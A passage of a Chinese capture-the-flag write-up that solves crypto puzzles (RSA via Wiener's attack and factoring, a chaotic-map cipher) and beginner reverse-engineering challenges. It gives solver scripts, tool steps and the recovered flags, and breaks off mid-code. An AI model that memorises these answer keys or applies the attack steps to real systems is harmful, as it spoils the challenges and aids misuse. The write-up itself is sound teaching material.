class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n * k</span><br><span class="line">        m, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level4：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># So is there anything wrong with RSA as shown below?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level4</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">64</span>)</span><br><span class="line">    e = inverse(d, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">4</span>:</span><br><span class="line">c = <span class="number">68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191</span></span><br><span class="line">e = <span class="number">51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751</span></span><br><span class="line">n = <span class="number">68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969</span></span><br></pre></td></tr></table></figure><p>看到这个e = inverse(d, (p-1) * (q-1))，考虑维纳攻击</p><p><img src="https://s2.loli.net/2023/08/04/es4S3aTG58rANxI.png" alt="image-20221005221502693.png"></p><p>level5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># What about different n? Just have a try with the hint!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level5</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    hint = <span class="built_in">pow</span>(d, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">5</span>:</span><br><span class="line">c = <span class="number">1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829</span></span><br><span class="line">hint = <span class="number">611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930</span></span><br><span class="line">n = <span class="number">1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979</span></span><br></pre></td></tr></table></figure><p>可以看到n很大，尝试用factor分解，没想到分解出来了。有可能是非预期解吧，hint没有用到。</p><p><img src="https://s2.loli.net/2023/08/04/WHezrFTZl64nNAD.png" alt="image-20221005222330514.png"></p><p>直接带入就能出flag。<br>flag{W0w_U_ar3_re4L1y_g0Od_4t_m4th_4nD_RSA!!}</p><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p>chaos.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LC</span>(<span class="params">key, x, times, flags</span>):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    xn = []</span><br><span class="line">    xn.append(x)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        xn.append(<span class="number">1</span> - <span class="number">2</span> * xn[<span class="number">0</span>]**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xn.append(k2 * xn[<span class="number">0</span>]**<span class="number">3</span> + (<span class="number">1</span> - k2)*xn[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="keyword">assert</span> xn[i]&gt;=-<span class="number">1</span> <span class="keyword">and</span> xn[i]&lt;=<span class="number">1</span> <span class="keyword">and</span> xn[i+<span class="number">1</span>]&gt;=-<span class="number">1</span> <span class="keyword">and</span> xn[i+<span class="number">1</span>]&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            xn.append((<span class="number">1</span> - <span class="number">2</span> * xn[i]**<span class="number">2</span>)*(k1 * xn[i+<span class="number">1</span>]**<span class="number">3</span> + (<span class="number">1</span> - k1)*xn[i+<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            xn.append((k2 * xn[i]**<span class="number">3</span> + (<span class="number">1</span> - k2)*xn[i])*(<span class="number">1</span> - <span class="number">2</span> * xn[i+<span class="number">1</span>]**<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> xn[times + <span class="number">1</span>]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="built_in">sum</span>, r, k = <span class="number">0</span>, <span class="number">1</span>, []</span><br><span class="line">    k1 = random.uniform(<span class="number">3.2</span>, <span class="number">4</span>)</span><br><span class="line">    k2 = random.uniform(<span class="number">3.2</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        k.append(random.randint(<span class="number">1</span>,<span class="number">256</span>))</span><br><span class="line">        <span class="built_in">sum</span> += k[-<span class="number">1</span>]</span><br><span class="line">        r ^= k[-<span class="number">1</span>]  </span><br><span class="line">    a_1 = (<span class="built_in">sum</span>/<span class="number">256</span>) % <span class="number">1</span></span><br><span class="line">    timea1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * a_1) % <span class="number">30</span></span><br><span class="line">    b_1 = (r/<span class="number">256</span>)</span><br><span class="line">    timeb1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * b_1) % <span class="number">30</span></span><br><span class="line">    xc_1 = a_1 * b_1</span><br><span class="line">    yc_1 = (a_1 + b_1) % <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k1, k2 = %r, %r&#x27;</span>%(k1, k2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k = %r&#x27;</span>%k)</span><br><span class="line">    <span class="keyword">return</span> (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key, data, flag</span>):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data</span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    m, c = [], []</span><br><span class="line">    miu, omiga = [], []</span><br><span class="line">    ta = timea1</span><br><span class="line">    tb = timeb1</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> flag:</span><br><span class="line">        mi = <span class="built_in">ord</span>(tmp)</span><br><span class="line">        miu.append(LC(key, a_1, ta, <span class="number">1</span>))</span><br><span class="line">        omiga.append(LC(key, b_1, tb, <span class="number">0</span>))</span><br><span class="line">        c.append(((<span class="built_in">int</span>(miu[-<span class="number">1</span>] * <span class="number">1000</span>) + <span class="built_in">int</span>(omiga[-<span class="number">1</span>] * <span class="number">1000</span>)) ^ mi) % <span class="number">256</span>)</span><br><span class="line">        delta = c[-<span class="number">1</span>]/<span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            y = (yc_1 + delta) % <span class="number">1</span></span><br><span class="line">            y = k1 * y**<span class="number">3</span> + (<span class="number">1</span> - k1) * y</span><br><span class="line">            x = xc_1</span><br><span class="line">            x = k2 * x**<span class="number">3</span> + (<span class="number">1</span> - k2) * x</span><br><span class="line">        ta = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * x) % <span class="number">30</span></span><br><span class="line">        tb = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * y) % <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c = %r&#x27;</span>%(c))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># print(flag)</span></span><br><span class="line">    key, data = init()</span><br><span class="line">    c = encrypt(key, data, flag)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">k1, k2 = 3.967139695598587, 3.7926025078694305                                          </span></span><br><span class="line"><span class="string">k = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]          </span></span><br><span class="line"><span class="string">c = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>已知条件：k1,k2,c</p><p><img src="https://s2.loli.net/2023/08/04/HwWngq7hCt1cR8I.png" alt="image-20221005222703786.png"></p><p>Step 1:</p><p>先看最底下先运行的部分,key,data = init()，跟进</p><p><img src="https://s2.loli.net/2023/08/04/ST4DIkqRQzMivBL.png" alt="image-20221005222737943.png"></p><p>首先，k1,k2是3.2到4区间的随机小数，题目print出来了，也就是key。 这是题目给我们的已知条件key</p><p>其次，sum,r,k给了我们，其中k也被print出来，我们看看k是什么东西。</p><p><img src="https://s2.loli.net/2023/08/04/qOir3mDT6WfCFaz.png" alt="image-20221005222838187.png"><br>k经过了16次循环，每次添加1-256之间的随机数，与此同时 sum和r也与k有关，那么题目告诉了我们k还有sum和r的原值，我们可以推出sum和r</p><p>sum和r又有什么用呢？</p><p><img src="https://s2.loli.net/2023/08/04/f7ASnbaVZqcr5NM.png" alt="image-20221005222911437.png"><br>这些数据都与sum和r有关，只要我们知道了sum和r，就可以知道这些数据，也就是return回去的data</p><p>所以我们已知条件已有：sum，r，k</p><p>可以推出 =&gt; a_1, timea1, b_1, timeb1, xc_1, yc_1 =&gt; data</p><p>已知：k1，k2 可以推出=&gt; key</p><p>先写脚本把data推出，遍历k，然后得出sum和r 最后把每个值得出即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>, r, k = <span class="number">0</span>, <span class="number">1</span>, [<span class="number">107</span>, <span class="number">99</span>, <span class="number">55</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">56</span>, <span class="number">137</span>, <span class="number">44</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">75</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">132</span>]  </span><br><span class="line">k1,k2 = <span class="number">3.967139695598587</span>, <span class="number">3.7926025078694305</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    r ^= i</span><br><span class="line">a_1 = (<span class="built_in">sum</span>/<span class="number">256</span>) % <span class="number">1</span></span><br><span class="line">timea1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * a_1) % <span class="number">30</span></span><br><span class="line">b_1 = (r/<span class="number">256</span>)</span><br><span class="line">timeb1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * b_1) % <span class="number">30</span></span><br><span class="line">xc_1 = a_1 * b_1</span><br><span class="line">yc_1 = (a_1 + b_1) % <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">data = (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">key = (k1,k2)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(key,data)</span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Hello-Reverse"><a href="#Hello-Reverse" class="headerlink" title="Hello_Reverse"></a>Hello_Reverse</h2><p>查壳，发现无壳，PE64位文件，直接丢进IDA64。</p><p><img src="https://s2.loli.net/2023/08/04/zjlI5qfAxcwJ3X9.png" alt="image-20221006102306809.png"></p><p>按shift + F12，搜索整个文件的字符串，拿到前半截flag</p><p><img src="https://s2.loli.net/2023/08/04/C7xNFYzcJt3aodQ.png" alt="image-20221006103517648.png"></p><p>找到主函数，按f5反汇编得到后半段flag</p><p><img src="https://s2.loli.net/2023/08/04/5E6ICToumFZAPhU.png" alt="image-20221006105430891.png"></p><p>flag{h3llo_r3vers1ng_w0rld}</p><h2 id="Baby-Re"><a href="#Baby-Re" class="headerlink" title="Baby_Re"></a>Baby_Re</h2><p>查壳，是ELF64位的无壳程序。</p><p><img src="https://s2.loli.net/2023/08/04/kIg9A3QxdBea6nj.png" alt="image-20221006105534153.png"></p><p>观察main函数，按n稍微改变下变量名好观察，可以发现我们的输入异或了自身下标，随后进去compare函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)input = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to RE world,Can you solve the problem?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now you should input your flag and i&#x27;ll tell you if it is right:&quot;</span>, argv, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, *(_QWORD *)&amp;v9);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    len = i;</span><br><span class="line">    <span class="keyword">if</span> ( len &gt;= <span class="built_in">strlen</span>(input) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    input[i] ^= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">compare</span>(input) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well done! You find the secret!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag is wrong! Maybe something run before main&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察compare函数，可以发现其直接与密文比较，那么进入final与自身下标异或。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 __fastcall <span class="title">compare</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The length of flag is Wrong!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">final</span>[i] != input[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/CBa2SckuydUxFeZ.png" alt="image-20221006110403727.png"></p><p>异或后发现flag是错误的。</p><p>看hint，程序真的都是从main开始的吗？简单来说程序的运行流程</p><ul><li>Init -&gt; main</li></ul><p>对抗这种Init段该了些数值的办法一个是动调。</p><p>另一个就是 X！交叉引用</p><p><img src="https://ppppz.net/2022/10/01/%E3%80%90NewStarCTF%E3%80%91WEEK1-REVERSE/image-20221002145534839.png" alt="image-20221002145534839"></p><p>即可在目标地方发现了改了密文的地方，密文这几个位被更改了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void FunctionName()</span><br><span class="line">&#123;</span><br><span class="line">  final[6] = 54;</span><br><span class="line">  final[11] = 58;</span><br><span class="line">  final[22] = 38;</span><br><span class="line">  final[30] = 63;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么拿到正确密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final=[<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x56</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x3A</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x51</span>, <span class="number">0x7D</span>, <span class="number">0x65</span>, <span class="number">0x7F</span>, <span class="number">0x4D</span>, <span class="number">0x71</span>, </span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x7A</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x62</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(final[i]^i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{S0meth1ng_run_bef0re_main!}</p><h2 id="Pyre"><a href="#Pyre" class="headerlink" title="Pyre"></a>Pyre</h2><p>python程序逆向，用pyinstxtractor.py解包</p><p><img src="https://s2.loli.net/2023/08/04/weUMphRnHK9tFSu.png" alt="image-20221006114234166.png"></p><p>直接uncompyle6反编译pyc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.8 (tags/v3.8.8:024d805, Feb 19 2021, 13:08:11) [MSC v.1928 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: pyre.py</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">encode = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">        tmp += <span class="built_in">input</span>[table[i]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    flag = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">23</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Length Wrong!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final = enc(flag)</span><br><span class="line">        <span class="keyword">if</span> final == encode:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Wow,you get the right 